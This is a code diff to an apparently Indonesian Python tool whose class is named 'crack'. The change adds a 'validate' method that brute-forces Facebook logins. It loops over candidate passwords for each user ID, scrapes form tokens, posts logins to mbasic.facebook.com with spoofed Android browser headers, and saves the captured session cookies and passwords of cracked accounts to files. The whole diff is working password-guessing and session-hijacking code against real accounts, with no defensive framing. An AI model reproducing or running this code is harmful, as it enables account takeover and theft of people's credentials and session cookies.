@@ -382,6 +382,7 @@ class crack:
 			print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
 			print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
 			print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
+			print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mMethode validate')
 			print ('')
 			self.langsung()
 		else:
@@ -419,6 +420,8 @@ class crack:
 					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
 					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
+				elif men in['5']:
+					titid.submit(self.validate, uid, pwx)
 				else:
 					exit("\n isi yang benar")
 					
@@ -460,6 +463,8 @@ class crack:
 					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
 					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
+				elif men in['5']:
+					titid.submit(self.validate, uid, pwx)
 				else:
 					exit("\n ! isi yang benar")
 					
@@ -543,49 +548,26 @@ class crack:
 		loop+=1
 
 
- #--- methode 2
-	def __validate__(self, uid, pwx, url_log):
+#
+	def validate(self, user, peweh):
 		global ok,cp,loop 
 		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
-		print (f"\r {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
-		ses = requests.Session
-		for pw in pwx:
-			try:
-				link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr").text
-				data = {
-					"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
-					"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
-					"uid": uid,"next": f"next=https://m.facebook.com/login/save-device/","flow": "login_no_pin","pass": pw}
-				headex = {"Host": URL,
-					"cache-control": "max-age=0",
-					"sec-ch-ua": f'"Android WebView";v="{str(rr(100,200))}", "Chromium";v="{str(rr(100,200))}", "Not.A/Brand";v="{str(rr(10,50))}"',
-					"sec-ch-ua-mobile": "?1",
-					"sec-ch-ua-platform": '"Android"',
-					"sec-ch-prefers-color-scheme": "dark",
-					"upgrade-insecure-requests": "1",
-					"origin": f"https://"+URL,
-					"content-type": "application/x-www-form-urlencoded",
-					"user-agent": self.UA(),
-					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-					"x-requested-with": "mark.via.gp",
-					"sec-fetch-site": "same-origin",
-					"sec-fetch-mode": "navigate",
-					"sec-fetch-user": "?1",
-					"sec-fetch-dest": "document",
-					"referer": f"https://{URL}/login/device-based/password/?uid={uid}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr",
-					"accept-encoding": "gzip, deflate, br, zstd",
-					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
-				post = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=data, headers=headex, allow_redirects=False)
-				if "c_user" in ses.cookies.get_dict():
-					ok+=1
-					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+		print (f"\r {komtol}Validate {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
+		for pw in peweh:
+			try: 
+				ses = requests.Session()
+				link=ses.get(f"https://h.facebook.com/hr/r?redirect_app=8&next=https://mbasic.facebook.com/login/?email%3D{user}%26next%3Dhttps%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-password%2F%3Fshbl%3D0%26li%3DcLF-ZserqdhNL4uoNn2Llk2F%26e%3D1348131%26shbl%3D1%26ref%3D104%26wtsid%3Drdr_0gJeDV3AqfDKxF1se%26refsrc%3Ddeprecated&zc=AfoZzlQMuhXRJoHiI3uWzLLH-2RVHnQSftgAhICbd0NhjnVNj-QMTScUiZMs4FLo5Pk&rtime=1719579008&ed=Afqp9CRIhnO3GHKOCrXEHsuSY6ZZo6O_8QGA7yzFCjfSbsVfUJoMF3L-ixmUq0PzBm5tExKjmFXyXkyXBibMti0V&hc=1&wtsid=rdr_0gJeDV3AqfDKxF1se&refsrc=deprecated&ref=104&_rdr")
+				data={'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': user,'pass': pw,'login': 'Masuk','bi_xrwh': '0',}
+				headers = {'User-Agent': f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(120,126))}.0.0.0 Mobile Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Content-Type': 'application/x-www-form-urlencoded','cache-control': 'max-age=0','dpr': '1.75','viewport-width': '980','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-ch-ua-model': '"SM-A115F"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-prefers-color-scheme': 'dark','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https://mbasic.facebook.com/login/device-based/validate-password/?shbl%3D0&refsrc=deprecated&lwv=100&refid=9&ref=104', headers=headers, data=data, allow_redirects=False)
+				if 'c_user' in ses.cookies.get_dict():
+					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
 					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
 					info = f"{user} ◊ {pw} ◊ {kukis}"
 					ok.append(f"{info}")
 					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
 					break
-				elif "checkpoint" in ses.cookies.get_dict():
-					cp+=1
+				elif 'checkpoint' in ses.cookies.get_dict():
 					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
 					info = f'{user} ◊ {pw}'
 					cp.append(f'{info}')
@@ -594,7 +576,8 @@ class crack:
 				else:
 					continue
 			except requests.exceptions.ConnectionError:
-				time.sleep(15)
+				time.sleep(31)
+			
 		loop+=1
 
 
